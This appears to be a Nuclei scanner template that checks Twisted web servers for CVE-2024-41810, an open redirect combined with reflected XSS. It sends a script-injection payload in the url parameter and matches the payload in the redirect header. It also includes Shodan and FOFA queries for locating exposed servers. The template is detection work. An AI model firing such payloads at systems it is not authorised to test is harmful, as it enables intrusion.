flow: http(1) && http(2)
http:
- matchers:
  - internal: true
    part: response
    type: word
    words:
    - TWISTED_SESSION
    - '["Twisted'
  raw:
  - 'GET / HTTP/1.1

    Host: {{Hostname}}

    '
  redirects: true
- matchers:
  - part: response
    type: word
    words:
    - 'Location: ws://example.com/"><script>alert(document.domain)</script>'
  - part: header
    type: word
    words:
    - text/html
  - status:
    - 302
    type: status
  matchers-condition: and
  method: GET
  path:
  - '{{BaseURL}}?url=ws://example.com/"><script>alert(document.domain)</script>'
  redirects: true
id: CVE-2024-41810
info:
  author: KoYejune0302,cheoljun99,sim4110,gy741
  classification:
    cpe: cpe:2.3:a:twistedmatrix:twisted:*:*:*:*:*:*:*:*
    cve-id: CVE-2024-41810
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N
    cvss-score: 6.1
    epss-percentile: 0.98526
    epss-score: 0.68165
  description: 'Twisted is an event-based framework for internet applications, supporting
    Python 3.6+. The Twisted web framework''s redirectTo function is vulnerable to
    reflected XSS if an attacker can control the redirect URL. This template tests
    for an open redirect and XSS vulnerability in the URL parameter. This vulnerability
    is fixed in 24.7.0rc1.

    '
  impact: 'Attackers can exploit open redirect and reflected XSS via the redirect
    URL parameter in the Twisted web framework.

    '
  metadata:
    fofa-query: body="twisted" && "python"
    max-request: 2
    shodan-query: html:'Twisted' html:"python"
  name: Twisted - Open Redirect & XSS
  reference:
  - https://github.com/advisories/GHSA-cf56-g6w6-pqq2
  - https://nvd.nist.gov/vuln/detail/CVE-2024-41810
  remediation: 'Update Twisted to version 24.7.0rc1 or later.

    '
  severity: medium
  tags: xss,redirect,twisted,python,vuln
